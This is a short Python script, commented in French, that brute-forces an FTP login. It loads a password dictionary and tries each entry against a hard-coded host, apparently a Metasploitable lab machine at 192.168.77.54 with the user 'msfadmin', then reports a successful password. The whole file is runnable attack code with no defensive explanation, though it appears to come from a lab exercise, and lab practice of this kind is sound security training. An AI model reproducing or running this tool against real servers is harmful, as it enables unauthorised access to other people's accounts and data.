import ftplib
import time

def attaque_ftp(ip, port, utilisateur, fichier_dictionnaire):
    try:
        with open(fichier_dictionnaire, 'r', encoding='utf-8') as f:
            mots_de_passe = [ligne.strip() for ligne in f if ligne.strip()]
    except FileNotFoundError:
        print(f"❌ Fichier dictionnaire introuvable : {fichier_dictionnaire}")
        return

    print(f"🔐 Début de l'attaque FTP sur {ip}:{port} avec l'utilisateur '{utilisateur}'")
    print(f"📘 Nombre de mots de passe à tester : {len(mots_de_passe)}\n")

    for i, mot_de_passe in enumerate(mots_de_passe, 1):
        try:
            print(f"[{i}] Tentative avec : {mot_de_passe}")
            ftp = ftplib.FTP()
            ftp.connect(ip, port, timeout=5)
            ftp.login(utilisateur, mot_de_passe)
            print(f"\n✅ Mot de passe trouvé : '{mot_de_passe}'")
            ftp.quit()
            return
        except ftplib.error_perm:
            continue
        except Exception as e:
            print(f"⚠️ Erreur de connexion : {e}")
            continue

    print("\n❌ Aucun mot de passe correct trouvé dans le dictionnaire.")

ip_cible = "192.168.77.54"  
port_ftp = 21              
utilisateur = "msfadmin"     
fichier_dico = "dictionnaire_djomo_carelle.txt" 

attaque_ftp(ip_cible, port_ftp, utilisateur, fichier_dico)